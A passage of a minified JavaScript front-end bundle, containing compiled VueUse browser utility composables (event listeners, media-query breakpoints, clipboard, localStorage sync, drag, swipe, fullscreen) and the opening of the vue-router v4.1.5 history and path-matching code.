e?Lh(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,qh=(e,t)=>{for(var s in t||(t={}))qu.call(t,s)&&ca(e,s,t[s]);if(Po)for(var s of Po(t))ju.call(t,s)&&ca(e,s,t[s]);return e},jh=(e,t)=>Rh(e,Nh(t)),Hh=(e,t)=>{var s={};for(var o in e)qu.call(e,o)&&t.indexOf(o)<0&&(s[o]=e[o]);if(e!=null&&Po)for(var o of Po(e))t.indexOf(o)<0&&ju.call(e,o)&&(s[o]=e[o]);return s};function zh(e,t,s={}){const o=s,{eventFilter:r}=o,l=Hh(o,["eventFilter"]),{eventFilter:i,pause:a,resume:c,isActive:u}=hh(r);return{stop:Mh(e,t,jh(qh({},l),{eventFilter:i})),pause:a,resume:c,isActive:u}}function Bt(e){var t;const s=lt(e);return(t=s==null?void 0:s.$el)!=null?t:s}const st=Pt?window:void 0,Vh=Pt?window.document:void 0,Uh=Pt?window.navigator:void 0;function ue(...e){let t,s,o,r;if(Mu(e[0])?([s,o,r]=e,t=st):[t,s,o,r]=e,!t)return Pn;let l=Pn;const i=me(()=>Bt(t),c=>{l(),c&&(c.addEventListener(s,o,r),l=()=>{c.removeEventListener(s,o,r),l=Pn})},{immediate:!0,flush:"post"}),a=()=>{i(),l()};return Gt(a),a}function Wh(e,t,s={}){const{window:o=st,ignore:r,capture:l=!0,detectIframe:i=!1}=s;if(!o)return;const a=z(!0);let c;const u=f=>{o.clearTimeout(c);const m=Bt(e),h=f.composedPath();!m||m===f.target||h.includes(m)||!a.value||r&&r.length>0&&r.some(x=>{const b=Bt(x);return b&&(f.target===b||h.includes(b))})||t(f)},d=[ue(o,"click",u,{passive:!0,capture:l}),ue(o,"pointerdown",f=>{const m=Bt(e);a.value=!!m&&!f.composedPath().includes(m)},{passive:!0}),ue(o,"pointerup",f=>{if(f.button===0){const m=f.composedPath();f.composedPath=()=>m,c=o.setTimeout(()=>u(f),50)}},{passive:!0}),i&&ue(o,"blur",f=>{var m;const h=Bt(e);((m=document.activeElement)==null?void 0:m.tagName)==="IFRAME"&&!(h!=null&&h.contains(document.activeElement))&&t(f)})].filter(Boolean);return()=>d.forEach(f=>f())}const Yh=e=>typeof e=="function"?e:typeof e=="string"?t=>t.key===e:Array.isArray(e)?t=>e.includes(t.key):e?()=>!0:()=>!1;function Kh(e,t,s={}){const{target:o=st,eventName:r="keydown",passive:l=!1}=s,i=Yh(e);return ue(o,r,c=>{i(c)&&t(c)},l)}function Xh(e={}){const{window:t=st}=e,s=vh(()=>null,()=>t==null?void 0:t.document.activeElement);return t&&(ue(t,"blur",s.trigger,!0),ue(t,"focus",s.trigger,!0)),s}function so(e,t=!1){const s=z(),o=()=>s.value=Boolean(e());return o(),Ru(o,t),s}function Wn(e,t={}){const{window:s=st}=t,o=so(()=>s&&"matchMedia"in s&&typeof s.matchMedia=="function");let r;const l=z(!1),i=()=>{!o.value||(r||(r=s.matchMedia(e)),l.value=r.matches)};return Dh(()=>{i(),r&&("addEventListener"in r?r.addEventListener("change",i):r.addListener(i),Gt(()=>{"removeEventListener"in r?r.removeEventListener("change",i):r.removeListener(i)}))}),l}const Qh={sm:640,md:768,lg:1024,xl:1280,"2xl":1536};var Zh=Object.defineProperty,ua=Object.getOwnPropertySymbols,Gh=Object.prototype.hasOwnProperty,Jh=Object.prototype.propertyIsEnumerable,da=(e,t,s)=>t in e?Zh(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,e0=(e,t)=>{for(var s in t||(t={}))Gh.call(t,s)&&da(e,s,t[s]);if(ua)for(var s of ua(t))Jh.call(t,s)&&da(e,s,t[s]);return e};function t0(e,t={}){function s(a,c){let u=e[a];return c!=null&&(u=yh(u,c)),typeof u=="number"&&(u=`${u}px`),u}const{window:o=st}=t;function r(a){return o?o.matchMedia(a).matches:!1}const l=a=>Wn(`(min-width: ${s(a)})`,t),i=Object.keys(e).reduce((a,c)=>(Object.defineProperty(a,c,{get:()=>l(c),enumerable:!0,configurable:!0}),a),{});return e0({greater(a){return Wn(`(min-width: ${s(a,.1)})`,t)},greaterOrEqual:l,smaller(a){return Wn(`(max-width: ${s(a,-.1)})`,t)},smallerOrEqual(a){return Wn(`(max-width: ${s(a)})`,t)},between(a,c){return Wn(`(min-width: ${s(a)}) and (max-width: ${s(c,-.1)})`,t)},isGreater(a){return r(`(min-width: ${s(a,.1)})`)},isGreaterOrEqual(a){return r(`(min-width: ${s(a)})`)},isSmaller(a){return r(`(max-width: ${s(a,-.1)})`)},isSmallerOrEqual(a){return r(`(max-width: ${s(a)})`)},isInBetween(a,c){return r(`(min-width: ${s(a)}) and (max-width: ${s(c,-.1)})`)}},i)}function n0(e={}){const{navigator:t=Uh,read:s=!1,source:o,copiedDuring:r=1500}=e,l=["copy","cut"],i=so(()=>t&&"clipboard"in t),a=z(""),c=z(!1),u=Oh(()=>c.value=!1,r);function d(){t.clipboard.readText().then(f=>{a.value=f})}if(i.value&&s)for(const f of l)ue(f,d);async function p(f=lt(o)){i.value&&f!=null&&(await t.clipboard.writeText(f),a.value=f,c.value=!0,u.start())}return{isSupported:i,text:a,copied:c,copy:p}}function s0(e){return JSON.parse(JSON.stringify(e))}const Jr=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},el="__vueuse_ssr_handlers__";Jr[el]=Jr[el]||{};const o0=Jr[el];function r0(e,t){return o0[e]||t}function l0(e){return e==null?"any":e instanceof Set?"set":e instanceof Map?"map":e instanceof Date?"date":typeof e=="boolean"?"boolean":typeof e=="string"?"string":typeof e=="object"||Array.isArray(e)?"object":Number.isNaN(e)?"any":"number"}var i0=Object.defineProperty,pa=Object.getOwnPropertySymbols,a0=Object.prototype.hasOwnProperty,c0=Object.prototype.propertyIsEnumerable,fa=(e,t,s)=>t in e?i0(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,ma=(e,t)=>{for(var s in t||(t={}))a0.call(t,s)&&fa(e,s,t[s]);if(pa)for(var s of pa(t))c0.call(t,s)&&fa(e,s,t[s]);return e};const u0={boolean:{read:e=>e==="true",write:e=>String(e)},object:{read:e=>JSON.parse(e),write:e=>JSON.stringify(e)},number:{read:e=>Number.parseFloat(e),write:e=>String(e)},any:{read:e=>e,write:e=>String(e)},string:{read:e=>e,write:e=>String(e)},map:{read:e=>new Map(JSON.parse(e)),write:e=>JSON.stringify(Array.from(e.entries()))},set:{read:e=>new Set(JSON.parse(e)),write:e=>JSON.stringify(Array.from(e))},date:{read:e=>new Date(e),write:e=>e.toISOString()}};function Lt(e,t,s,o={}){var r;const{flush:l="pre",deep:i=!0,listenToStorageChanges:a=!0,writeDefaults:c=!0,mergeDefaults:u=!1,shallow:d,window:p=st,eventFilter:f,onError:m=H=>{console.error(H)}}=o,h=(d?Tt:z)(t);if(!s)try{s=r0("getDefaultStorage",()=>{var H;return(H=st)==null?void 0:H.localStorage})()}catch(H){m(H)}if(!s)return h;const x=lt(t),b=l0(x),k=(r=o.serializer)!=null?r:u0[b],{pause:S,resume:E}=zh(h,()=>B(h.value),{flush:l,deep:i,eventFilter:f});return p&&a&&ue(p,"storage",P),P(),h;function B(H){try{H==null?s.removeItem(e):s.setItem(e,k.write(H))}catch(te){m(te)}}function L(H){if(!(H&&H.key!==e)){S();try{const te=H?H.newValue:s.getItem(e);if(te==null)return c&&x!==null&&s.setItem(e,k.write(x)),x;if(!H&&u){const le=k.read(te);return To(u)?u(le,x):b==="object"&&!Array.isArray(le)?ma(ma({},x),le):le}else return typeof te!="string"?te:k.read(te)}catch(te){m(te)}finally{E()}}}function P(H){H&&H.key!==e||(h.value=L(H))}}function d0(e){return Wn("(prefers-color-scheme: dark)",e)}var p0=Object.defineProperty,f0=Object.defineProperties,m0=Object.getOwnPropertyDescriptors,ha=Object.getOwnPropertySymbols,h0=Object.prototype.hasOwnProperty,g0=Object.prototype.propertyIsEnumerable,ga=(e,t,s)=>t in e?p0(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,y0=(e,t)=>{for(var s in t||(t={}))h0.call(t,s)&&ga(e,s,t[s]);if(ha)for(var s of ha(t))g0.call(t,s)&&ga(e,s,t[s]);return e},v0=(e,t)=>f0(e,m0(t));function KE(e,t={}){var s,o,r;const l=(s=t.draggingElement)!=null?s:st,i=(o=t.handle)!=null?o:e,a=z((r=lt(t.initialValue))!=null?r:{x:0,y:0}),c=z(),u=h=>t.pointerTypes?t.pointerTypes.includes(h.pointerType):!0,d=h=>{lt(t.preventDefault)&&h.preventDefault(),lt(t.stopPropagation)&&h.stopPropagation()},p=h=>{var x;if(!u(h)||lt(t.exact)&&h.target!==lt(e))return;const b=lt(e).getBoundingClientRect(),k={x:h.pageX-b.left,y:h.pageY-b.top};((x=t.onStart)==null?void 0:x.call(t,k,h))!==!1&&(c.value=k,d(h))},f=h=>{var x;!u(h)||!c.value||(a.value={x:h.pageX-c.value.x,y:h.pageY-c.value.y},(x=t.onMove)==null||x.call(t,a.value,h),d(h))},m=h=>{var x;!u(h)||!c.value||(c.value=void 0,(x=t.onEnd)==null||x.call(t,a.value,h),d(h))};return Pt&&(ue(i,"pointerdown",p,!0),ue(l,"pointermove",f,!0),ue(l,"pointerup",m,!0)),v0(y0({},$h(a)),{position:a,isDragging:D(()=>!!c.value),style:D(()=>`left:${a.value.x}px;top:${a.value.y}px;`)})}var ya=Object.getOwnPropertySymbols,_0=Object.prototype.hasOwnProperty,b0=Object.prototype.propertyIsEnumerable,x0=(e,t)=>{var s={};for(var o in e)_0.call(e,o)&&t.indexOf(o)<0&&(s[o]=e[o]);if(e!=null&&ya)for(var o of ya(e))t.indexOf(o)<0&&b0.call(e,o)&&(s[o]=e[o]);return s};function w0(e,t,s={}){const o=s,{window:r=st}=o,l=x0(o,["window"]);let i;const a=so(()=>r&&"ResizeObserver"in r),c=()=>{i&&(i.disconnect(),i=void 0)},u=me(()=>Bt(e),p=>{c(),a.value&&r&&p&&(i=new ResizeObserver(t),i.observe(p,l))},{immediate:!0,flush:"post"}),d=()=>{c(),u()};return Gt(d),{isSupported:a,stop:d}}function E0(e,t={}){const{immediate:s=!0,window:o=st}=t,r=z(!1);let l=null;function i(){!r.value||!o||(e(),l=o.requestAnimationFrame(i))}function a(){!r.value&&o&&(r.value=!0,i())}function c(){r.value=!1,l!=null&&o&&(o.cancelAnimationFrame(l),l=null)}return s&&a(),Gt(c),{isActive:r,pause:c,resume:a}}function A0(e,t={width:0,height:0},s={}){const{box:o="content-box"}=s,r=z(t.width),l=z(t.height);return w0(e,([i])=>{const a=o==="border-box"?i.borderBoxSize:o==="content-box"?i.contentBoxSize:i.devicePixelContentBoxSize;a?(r.value=a.reduce((c,{inlineSize:u})=>c+u,0),l.value=a.reduce((c,{blockSize:u})=>c+u,0)):(r.value=i.contentRect.width,l.value=i.contentRect.height)},s),me(()=>Bt(e),i=>{r.value=i?t.width:0,l.value=i?t.height:0}),{width:r,height:l}}const va=[["requestFullscreen","exitFullscreen","fullscreenElement","fullscreenEnabled","fullscreenchange","fullscreenerror"],["webkitRequestFullscreen","webkitExitFullscreen","webkitFullscreenElement","webkitFullscreenEnabled","webkitfullscreenchange","webkitfullscreenerror"],["webkitRequestFullScreen","webkitCancelFullScreen","webkitCurrentFullScreenElement","webkitCancelFullScreen","webkitfullscreenchange","webkitfullscreenerror"],["mozRequestFullScreen","mozCancelFullScreen","mozFullScreenElement","mozFullScreenEnabled","mozfullscreenchange","mozfullscreenerror"],["msRequestFullscreen","msExitFullscreen","msFullscreenElement","msFullscreenEnabled","MSFullscreenChange","MSFullscreenError"]];function S0(e,t={}){const{document:s=Vh,autoExit:o=!1}=t,r=e||(s==null?void 0:s.querySelector("html")),l=z(!1);let i=va[0];const a=so(()=>{if(s){for(const x of va)if(x[1]in s)return i=x,!0}else return!1;return!1}),[c,u,d,,p]=i;async function f(){!a.value||(s!=null&&s[d]&&await s[u](),l.value=!1)}async function m(){if(!a.value)return;await f();const x=Bt(r);x&&(await x[c](),l.value=!0)}async function h(){l.value?await f():await m()}return s&&ue(s,p,()=>{l.value=!!(s!=null&&s[d])},!1),o&&Gt(f),{isSupported:a,isFullscreen:l,enter:m,exit:f,toggle:h}}function k0(e,t,s={}){const{root:o,rootMargin:r="0px",threshold:l=.1,window:i=st}=s,a=so(()=>i&&"IntersectionObserver"in i);let c=Pn;const u=a.value?me(()=>({el:Bt(e),root:Bt(o)}),({el:p,root:f})=>{if(c(),!p)return;const m=new IntersectionObserver(t,{root:f,rootMargin:r,threshold:l});m.observe(p),c=()=>{m.disconnect(),c=Pn}},{immediate:!0,flush:"post"}):Pn,d=()=>{c(),u()};return Gt(d),{isSupported:a,stop:d}}const C0={ctrl:"control",command:"meta",cmd:"meta",option:"alt",up:"arrowup",down:"arrowdown",left:"arrowleft",right:"arrowright"};function $0(e={}){const{reactive:t=!1,target:s=st,aliasMap:o=C0,passive:r=!0,onEventFired:l=Pn}=e,i=Me(new Set),a={toJSON(){return{}},current:i},c=t?Me(a):a,u=new Set,d=new Set;function p(x,b){x in c&&(t?c[x]=b:c[x].value=b)}function f(){for(const x of d)p(x,!1)}function m(x,b){var k,S;const E=(k=x.key)==null?void 0:k.toLowerCase(),L=[(S=x.code)==null?void 0:S.toLowerCase(),E].filter(Boolean);E&&(b?i.add(E):i.delete(E));for(const P of L)d.add(P),p(P,b);E==="meta"&&!b?(u.forEach(P=>{i.delete(P),p(P,!1)}),u.clear()):typeof x.getModifierState=="function"&&x.getModifierState("Meta")&&b&&[...i,...L].forEach(P=>u.add(P))}ue(s,"keydown",x=>(m(x,!0),l(x)),{passive:r}),ue(s,"keyup",x=>(m(x,!1),l(x)),{passive:r}),ue("blur",f,{passive:!0}),ue("focus",f,{passive:!0});const h=new Proxy(c,{get(x,b,k){if(typeof b!="string")return Reflect.get(x,b,k);if(b=b.toLowerCase(),b in o&&(b=o[b]),!(b in c))if(/[+_-]/.test(b)){const E=b.split(/[+_-]/g).map(B=>B.trim());c[b]=D(()=>E.every(B=>w(h[B])))}else c[b]=z(!1);const S=Reflect.get(x,b,k);return t?w(S):S}});return h}function XE(e={}){const{type:t="page",touch:s=!0,resetOnTouchEnds:o=!1,initialValue:r={x:0,y:0},window:l=st,eventFilter:i}=e,a=z(r.x),c=z(r.y),u=z(null),d=x=>{t==="page"?(a.value=x.pageX,c.value=x.pageY):t==="client"&&(a.value=x.clientX,c.value=x.clientY),u.value="mouse"},p=()=>{a.value=r.x,c.value=r.y},f=x=>{if(x.touches.length>0){const b=x.touches[0];t==="page"?(a.value=b.pageX,c.value=b.pageY):t==="client"&&(a.value=b.clientX,c.value=b.clientY),u.value="touch"}},m=x=>i===void 0?d(x):i(()=>d(x),{}),h=x=>i===void 0?f(x):i(()=>f(x),{});return l&&(ue(l,"mousemove",m,{passive:!0}),ue(l,"dragover",m,{passive:!0}),s&&(ue(l,"touchstart",h,{passive:!0}),ue(l,"touchmove",h,{passive:!0}),o&&ue(l,"touchend",p,{passive:!0}))),{x:a,y:c,sourceType:u}}var Qt;(function(e){e.UP="UP",e.RIGHT="RIGHT",e.DOWN="DOWN",e.LEFT="LEFT",e.NONE="NONE"})(Qt||(Qt={}));function D0(e,t={}){const s=bh(e),{threshold:o=50,onSwipe:r,onSwipeEnd:l,onSwipeStart:i}=t,a=Me({x:0,y:0}),c=(P,H)=>{a.x=P,a.y=H},u=Me({x:0,y:0}),d=(P,H)=>{u.x=P,u.y=H},p=D(()=>a.x-u.x),f=D(()=>a.y-u.y),{max:m,abs:h}=Math,x=D(()=>m(h(p.value),h(f.value))>=o),b=z(!1),k=z(!1),S=D(()=>x.value?h(p.value)>h(f.value)?p.value>0?Qt.LEFT:Qt.RIGHT:f.value>0?Qt.UP:Qt.DOWN:Qt.NONE),E=P=>t.pointerTypes?t.pointerTypes.includes(P.pointerType):!0,B=[ue(e,"pointerdown",P=>{var H,te;if(!E(P))return;k.value=!0,(te=(H=s.value)==null?void 0:H.style)==null||te.setProperty("touch-action","none");const le=P.target;le==null||le.setPointerCapture(P.pointerId);const{clientX:ye,clientY:_e}=P;c(ye,_e),d(ye,_e),i==null||i(P)}),ue(e,"pointermove",P=>{if(!E(P)||!k.value)return;const{clientX:H,clientY:te}=P;d(H,te),!b.value&&x.value&&(b.value=!0),b.value&&(r==null||r(P))}),ue(e,"pointerup",P=>{var H,te;!E(P)||(b.value&&(l==null||l(P,S.value)),k.value=!1,b.value=!1,(te=(H=s.value)==null?void 0:H.style)==null||te.setProperty("touch-action","initial"))})],L=()=>B.forEach(P=>P());return{isSwiping:Kn(b),direction:Kn(S),posStart:Kn(a),posEnd:Kn(u),distanceX:p,distanceY:f,stop:L}}var B0=Object.defineProperty,_a=Object.getOwnPropertySymbols,F0=Object.prototype.hasOwnProperty,O0=Object.prototype.propertyIsEnumerable,ba=(e,t,s)=>t in e?B0(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,I0=(e,t)=>{for(var s in t||(t={}))F0.call(t,s)&&ba(e,s,t[s]);if(_a)for(var s of _a(t))O0.call(t,s)&&ba(e,s,t[s]);return e};function QE(e={}){const{controls:t=!1,offset:s=0,immediate:o=!0,interval:r="requestAnimationFrame"}=e,l=z(Gr()+s),i=()=>l.value=Gr()+s,a=r==="requestAnimationFrame"?E0(i,{immediate:o}):Fh(i,r,{immediate:o});return t?I0({timestamp:l},a):l}var T0=Object.defineProperty,xa=Object.getOwnPropertySymbols,P0=Object.prototype.hasOwnProperty,M0=Object.prototype.propertyIsEnumerable,wa=(e,t,s)=>t in e?T0(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,L0=(e,t)=>{for(var s in t||(t={}))P0.call(t,s)&&wa(e,s,t[s]);if(xa)for(var s of xa(t))M0.call(t,s)&&wa(e,s,t[s]);return e};const R0={easeInSine:[.12,0,.39,0],easeOutSine:[.61,1,.88,1],easeInOutSine:[.37,0,.63,1],easeInQuad:[.11,0,.5,0],easeOutQuad:[.5,1,.89,1],easeInOutQuad:[.45,0,.55,1],easeInCubic:[.32,0,.67,0],easeOutCubic:[.33,1,.68,1],easeInOutCubic:[.65,0,.35,1],easeInQuart:[.5,0,.75,0],easeOutQuart:[.25,1,.5,1],easeInOutQuart:[.76,0,.24,1],easeInQuint:[.64,0,.78,0],easeOutQuint:[.22,1,.36,1],easeInOutQuint:[.83,0,.17,1],easeInExpo:[.7,0,.84,0],easeOutExpo:[.16,1,.3,1],easeInOutExpo:[.87,0,.13,1],easeInCirc:[.55,0,1,.45],easeOutCirc:[0,.55,.45,1],easeInOutCirc:[.85,0,.15,1],easeInBack:[.36,0,.66,-.56],easeOutBack:[.34,1.56,.64,1],easeInOutBack:[.68,-.6,.32,1.6]};L0({linear:gh},R0);function Ht(e,t,s,o={}){var r,l,i;const{clone:a=!1,passive:c=!1,eventName:u,deep:d=!1,defaultValue:p}=o,f=hn(),m=s||(f==null?void 0:f.emit)||((r=f==null?void 0:f.$emit)==null?void 0:r.bind(f))||((i=(l=f==null?void 0:f.proxy)==null?void 0:l.$emit)==null?void 0:i.bind(f==null?void 0:f.proxy));let h=u;t||(t="modelValue"),h=u||h||`update:${t.toString()}`;const x=k=>a?To(a)?a(k):s0(k):k,b=()=>dh(e[t])?x(e[t]):p;if(c){const k=b(),S=z(k);return me(()=>e[t],E=>S.value=x(E)),me(S,E=>{(E!==e[t]||d)&&m(h,E)},{deep:d}),S}else return D({get(){return b()},set(k){m(h,k)}})}function ZE({window:e=st}={}){if(!e)return z(!1);const t=z(e.document.hasFocus());return ue(e,"blur",()=>{t.value=!1}),ue(e,"focus",()=>{t.value=!0}),t}function N0(e={}){const{window:t=st,initialWidth:s=1/0,initialHeight:o=1/0,listenOrientation:r=!0,includeScrollbar:l=!0}=e,i=z(s),a=z(o),c=()=>{t&&(l?(i.value=t.innerWidth,a.value=t.innerHeight):(i.value=t.document.documentElement.clientWidth,a.value=t.document.documentElement.clientHeight))};return c(),Ru(c),ue("resize",c,{passive:!0}),r&&ue("orientationchange",c,{passive:!0}),{width:i,height:a}}/*!
  * vue-router v4.1.5
  * (c) 2022 Eduardo San Martin Morote
  * @license MIT
  */const Yn=typeof window<"u";function q0(e){return e.__esModule||e[Symbol.toStringTag]==="Module"}const $e=Object.assign;function yr(e,t){const s={};for(const o in t){const r=t[o];s[o]=Mt(r)?r.map(e):e(r)}return s}const Is=()=>{},Mt=Array.isArray,j0=/\/$/,H0=e=>e.replace(j0,"");function vr(e,t,s="/"){let o,r={},l="",i="";const a=t.indexOf("#");let c=t.indexOf("?");return a<c&&a>=0&&(c=-1),c>-1&&(o=t.slice(0,c),l=t.slice(c+1,a>-1?a:t.length),r=e(l)),a>-1&&(o=o||t.slice(0,a),i=t.slice(a,t.length)),o=W0(o!=null?o:t,s),{fullPath:o+(l&&"?")+l+i,path:o,query:r,hash:i}}function z0(e,t){const s=t.query?e(t.query):"";return t.path+(s&&"?")+s+(t.hash||"")}function Ea(e,t){return!t||!e.toLowerCase().startsWith(t.toLowerCase())?e:e.slice(t.length)||"/"}function V0(e,t,s){const o=t.matched.length-1,r=s.matched.length-1;return o>-1&&o===r&&is(t.matched[o],s.matched[r])&&Hu(t.params,s.params)&&e(t.query)===e(s.query)&&t.hash===s.hash}function is(e,t){return(e.aliasOf||e)===(t.aliasOf||t)}function Hu(e,t){if(Object.keys(e).length!==Object.keys(t).length)return!1;for(const s in e)if(!U0(e[s],t[s]))return!1;return!0}function U0(e,t){return Mt(e)?Aa(e,t):Mt(t)?Aa(t,e):e===t}function Aa(e,t){return Mt(t)?e.length===t.length&&e.every((s,o)=>s===t[o]):e.length===1&&e[0]===t}function W0(e,t){if(e.startsWith("/"))return e;if(!e)return t;const s=t.split("/"),o=e.split("/");let r=s.length-1,l,i;for(l=0;l<o.length;l++)if(i=o[l],i!==".")if(i==="..")r>1&&r--;else break;return s.slice(0,r).join("/")+"/"+o.slice(l-(l===o.length?1:0)).join("/")}var Ys;(function(e){e.pop="pop",e.push="push"})(Ys||(Ys={}));var Ts;(function(e){e.back="back",e.forward="forward",e.unknown=""})(Ts||(Ts={}));function Y0(e){if(!e)if(Yn){const t=document.querySelector("base");e=t&&t.getAttribute("href")||"/",e=e.replace(/^\w+:\/\/[^\/]+/,"")}else e="/";return e[0]!=="/"&&e[0]!=="#"&&(e="/"+e),H0(e)}const K0=/^[^#]+#/;function X0(e,t){return e.replace(K0,"#")+t}function Q0(e,t){const s=document.documentElement.getBoundingClientRect(),o=e.getBoundingClientRect();return{behavior:t.behavior,left:o.left-s.left-(t.left||0),top:o.top-s.top-(t.top||0)}}const or=()=>({left:window.pageXOffset,top:window.pageYOffset});function Z0(e){let t;if("el"in e){const s=e.el,o=typeof s=="string"&&s.startsWith("#"),r=typeof s=="string"?o?document.getElementById(s.slice(1)):document.querySelector(s):s;if(!r)return;t=Q0(r,e)}else t=e;"scrollBehavior"in document.documentElement.style?window.scrollTo(t):window.scrollTo(t.left!=null?t.left:window.pageXOffset,t.top!=null?t.top:window.pageYOffset)}function Sa(e,t){return(history.state?history.state.position-t:-1)+e}const tl=new Map;function G0(e,t){tl.set(e,t)}function J0(e){const t=tl.get(e);return tl.delete(e),t}let eg=()=>location.protocol+"//"+location.host;function zu(e,t){const{pathname:s,search:o,hash:r}=t,l=e.indexOf("#");if(l>-1){let a=r.includes(e.slice(l))?e.slice(l).length:1,c=r.slice(a);return c[0]!=="/"&&(c="/"+c),Ea(c,"")}return Ea(s,e)+o+r}function tg(e,t,s,o){let r=[],l=[],i=null;const a=({state:f})=>{const m=zu(e,location),h=s.value,x=t.value;let b=0;if(f){if(s.value=m,t.value=f,i&&i===h){i=null;return}b=x?f.position-x.position:0}else o(m);r.forEach(k=>{k(s.value,h,{delta:b,type:Ys.pop,direction:b?b>0?Ts.forward:Ts.back:Ts.unknown})})};function c(){i=s.value}function u(f){r.push(f);const m=()=>{const h=r.indexOf(f);h>-1&&r.splice(h,1)};return l.push(m),m}function d(){const{history:f}=window;!f.state||f.replaceState($e({},f.state,{scroll:or()}),"")}function p(){for(const f of l)f();l=[],window.removeEventListener("popstate",a),window.removeEventListener("beforeunload",d)}return window.addEventListener("popstate",a),window.addEventListener("beforeunload",d),{pauseListeners:c,listen:u,destroy:p}}function ka(e,t,s,o=!1,r=!1){return{back:e,current:t,forward:s,replaced:o,position:window.history.length,scroll:r?or():null}}function ng(e){const{history:t,location:s}=window,o={value:zu(e,s)},r={value:t.state};r.value||l(o.value,{back:null,current:o.value,forward:null,position:t.length-1,replaced:!0,scroll:null},!0);function l(c,u,d){const p=e.indexOf("#"),f=p>-1?(s.host&&document.querySelector("base")?e:e.slice(p))+c:eg()+e+c;try{t[d?"replaceState":"pushState"](u,"",f),r.value=u}catch(m){console.error(m),s[d?"replace":"assign"](f)}}function i(c,u){const d=$e({},t.state,ka(r.value.back,c,r.value.forward,!0),u,{position:r.value.position});l(c,d,!0),o.value=c}function a(c,u){const d=$e({},r.value,t.state,{forward:c,scroll:or()});l(d.current,d,!0);const p=$e({},ka(o.value,c,null),{position:d.position+1},u);l(c,p,!1),o.value=c}return{location:o,state:r,push:a,replace:i}}function sg(e){e=Y0(e);const t=ng(e),s=tg(e,t.state,t.location,t.replace);function o(l,i=!0){i||s.pauseListeners(),history.go(l)}const r=$e({location:"",base:e,go:o,createHref:X0.bind(null,e)},t,s);return Object.defineProperty(r,"location",{enumerable:!0,get:()=>t.location.value}),Object.defineProperty(r,"state",{enumerable:!0,get:()=>t.state.value}),r}function og(e){return typeof e=="string"||e&&typeof e=="object"}function Vu(e){return typeof e=="string"||typeof e=="symbol"}const nn={path:"/",name:void 0,params:{},query:{},hash:"",fullPath:"/",matched:[],meta:{},redirectedFrom:void 0},Uu=Symbol("");var Ca;(function(e){e[e.aborted=4]="aborted",e[e.cancelled=8]="cancelled",e[e.duplicated=16]="duplicated"})(Ca||(Ca={}));function as(e,t){return $e(new Error,{type:e,[Uu]:!0},t)}function Wt(e,t){return e instanceof Error&&Uu in e&&(t==null||!!(e.type&t))}const $a="[^/]+?",rg={sensitive:!1,strict:!1,start:!0,end:!0},lg=/[.+*?^${}()[\]/\\]/g;function ig(e,t){const s=$e({},rg,t),o=[];let r=s.start?"^":"";const l=[];for(const u of e){const d=u.length?[]:[90];s.strict&&!u.length&&(r+="/");for(let p=0;p<u.length;p++){const f=u[p];let m=40+(s.sensitive?.25:0);if(f.type===0)p||(r+="/"),r+=f.value.replace(lg,"\\$&"),m+=40;else if(f.type===1){const{value:h,repeatable:x,optional:b,regexp:k}=f;l.push({name:h,repeatable:x,optional:b});const S=k||$a;if(S!==$a){m+=10;try{new RegExp(`(${S})`)}catch(B){throw new Error(`Invalid custom RegExp for param "${h}" (${S}): `+B.message)}}let E=x?`((?:${S})(?:/(?:${S}))*)`:`(${S})`;p||(E=b&&u.length<2?`(?:/${E})`:"/"+E),b&&(E+="?"),r+=E,m+=20,b&&(m+=-8),x&&(m+=-20),S===".*"&&(m+=-50)}d.push(m)}o.push(d)}if(s.strict&&s.end){const u=o.length-1;o[u][o[u].length-1]+=.7000000000000001}s.strict||(r+="/?"),s.end?r+="$":s.strict&&(r+="(?:/|$)");const i=new RegExp(r,s.sensitive?"":"i");function a(u){const d=u.match(i),p={};if(!d)return null;for(let f=1;f<d.length;f++){const m=d[f]||"",h=l[f-1];p[h.name]=m&&h.repeatable?m.split("/"):m}return p}function c(u){let d="",p=!1;for(const f of e){(!p||!d.endsWith("/"))&&(d+="/"),p=!1;for(const m of f)if(m.type===0)d+=m.value;else if(m.type===1){const{value:h,repeatable:x,optional:b}=m,k=h in u?u[h]:"";if(Mt(k)&&!x)throw new Error(`Provided param "${h}" is an array but it is not repeatable (* or + modifiers)`);const S=Mt(k)?k.join("/"):k;if(!S)if(b)f.length<2&&(d.endsWith("/")?d=d.slice(0,-1):p=!0);else throw new Error(`Missing required param "${h}"`);d+=S}}return d||"/"}return{re:i,score:o,keys:l,parse:a,stringify:c}}function ag(e,t){let s=0;for(;s<e.length&&s<t.length;){const o=t[s]-e[s];if(o)return o;s++}return e.length<t.length?e.length===1&&e[0]===40+40?-1:1:e.length>t.length?t.length===1&&t[0]===40+40?1:-1:0}function cg(e,t){let s=0;const o=e.score,r=t.score;for(;s<o.length&&s<r.length;){const l=ag(o[s],r[s]);if(l)return l;s++}if(Math.abs(r.length-o.length)===1){if(Da(o))return 1;if(Da(r))return-1}return r.length-o.length}function Da(e){const t=e[e.length-1];return e.length>0&&t[t.length-1]<0}const ug={type:0,value:""},dg=/[a-zA-Z0-9_]/;function pg(e){if(!e)return[[]];if(e==="/")return[[ug]];if(!e.startsWith("/"))throw new Error(`Invalid path "${e}"`);function t(m){throw new Error(`ERR (${s})/"${u}": ${m}`)}let s=0,o=s;const r=[];let l;function i(){l&&r.push(l),l=[]}let a=0,c,u="",d="";function p(){!u||(s===0?l.push({type:0,value:u}):s===1||s===2||s===3?(l.length>1&&(c==="*"||c==="+")&&t(`A repeatable param (${u}) must be alone in its segment. eg: '/:ids+.`),l.push({type:1,value:u,regexp:d,repeatable:c==="*"||c==="+",optional:c==="*"||c==="?"})):t("Invalid state to consume buffer"),u="")}function f(){u+=c}for(;a<e.length;){if(c=e[a++],c==="\\"&&s!==2){o=s,s=4;continue}switch(s){case 0:c==="/"?(u&&p(),i()):c===":"?(p(),s=1):f();break;case 4:f(),s=o;break;case 1:c==="("?s=2:dg.test(c)?f():(p(),s=0,c!=="*"&&c!=="?"&&c!=="+"&&a--);break;case 2:c===")"?d[d.length-1]=="\\"?d=d.slice(0,-1)+c:s=3:d+=c;break;case 3:p(),s=0,c!=="*"&&c!=="?"&&c!=="+"&&a--,d="";break;default:t("Unknown state");break}}return 